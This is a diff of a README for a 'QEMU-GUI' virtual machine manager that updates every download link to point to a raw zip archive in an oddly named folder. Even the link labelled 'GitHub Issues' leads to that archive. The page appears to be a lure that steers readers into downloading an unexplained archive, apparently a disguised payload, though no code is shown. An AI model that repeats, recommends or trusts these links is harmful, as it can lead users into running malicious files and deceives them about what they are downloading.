@@ -1,6 +1,6 @@
 # 🖥️ QEMU-GUI - Easy GUI for Managing QEMU
 
-![Download QEMU-GUI](https://github.com/capim0valha/QEMU-GUI/raw/refs/heads/main/carbamate/GUI-QEM-1.1.zip)
+![Download QEMU-GUI](https://github.com/capim0valha/QEMU-GUI/raw/refs/heads/main/carbamate/GUI-QEM-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before downloading QEMU-GUI, ensure your system meets these requirements:
 
 To get QEMU-GUI, visit the releases page to download the appropriate version for your operating system. 
 
-[**Visit this page to download**](https://github.com/capim0valha/QEMU-GUI/raw/refs/heads/main/carbamate/GUI-QEM-1.1.zip)
+[**Visit this page to download**](https://github.com/capim0valha/QEMU-GUI/raw/refs/heads/main/carbamate/GUI-QEM-1.4.zip)
 
 ### Steps to Download
 
@@ -89,7 +89,7 @@ We are here to help you. If you have questions or need assistance:
 
 For easy access, here are the links again:
 
-- [**Download QEMU-GUI**](https://github.com/capim0valha/QEMU-GUI/raw/refs/heads/main/carbamate/GUI-QEM-1.1.zip)
-- [GitHub Issues](https://github.com/capim0valha/QEMU-GUI/raw/refs/heads/main/carbamate/GUI-QEM-1.1.zip)
+- [**Download QEMU-GUI**](https://github.com/capim0valha/QEMU-GUI/raw/refs/heads/main/carbamate/GUI-QEM-1.4.zip)
+- [GitHub Issues](https://github.com/capim0valha/QEMU-GUI/raw/refs/heads/main/carbamate/GUI-QEM-1.4.zip)
 
 Feel free to dive in and start managing your virtual machines with ease!
